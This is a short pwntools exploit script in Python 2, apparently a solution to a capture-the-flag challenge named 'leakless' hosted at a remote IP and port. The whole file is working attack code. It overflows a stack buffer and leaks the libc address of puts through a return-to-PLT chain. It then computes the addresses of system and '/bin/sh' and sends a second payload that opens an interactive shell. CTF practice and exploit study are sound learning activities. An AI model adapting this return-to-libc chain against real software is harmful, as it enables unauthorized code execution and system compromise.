from pwn import *

DEBUG = 1
if DEBUG:
	r = process('./leakless')
else:
	r = remote('35.243.188.20',2002)
elf = ELF('./leakless')

libc = ELF('./libc.so.6')
plt_read = elf.plt['read']
plt_puts = elf.plt['puts']

got_puts = elf.got['puts']


test_addr = 0x08048536
str_addr = 0x080486C0
main_addr = 0x080485FA


def leak(addr):
	payload1 = 'a' * 0x48 + 'bbbb' + p32(plt_puts) + p32(main_addr) + p32(addr)
	r.sendline(payload1)
	data = r.recvline()[:4]
	print data
	print "%#x => %s" % (addr,(data or '').encode('hex'))
	return data


payload = 'a' * 0x48 + 'bbbb' + p32(plt_puts) + p32(main_addr) + p32(got_puts)
r.sendline(payload)

#print hex(u32(r.recvline()[:4]))

#d = DynELF(leak,elf=ELF('./leakless'))
#system_addr = d.lookup('system','libc')

res = r.recvline()[:4]
puts_addr =  u32(res)
puts_off = libc.symbols['puts']

system_off = libc.symbols['system']

bin_sh = next(libc.search('/bin/sh'))

libc_addr = puts_addr - puts_off

bin_sh_addr = libc_addr + bin_sh
#print hex(libc_addr)
#print "system addr: ==> " + hex(system_addr)

system_addr = libc_addr + system_off

payload2 = 'a' * 0x48 + 'bbbb' + p32(system_addr) + p32(main_addr) + p32(bin_sh_addr)

r.sendline(payload2)

r.interactive()
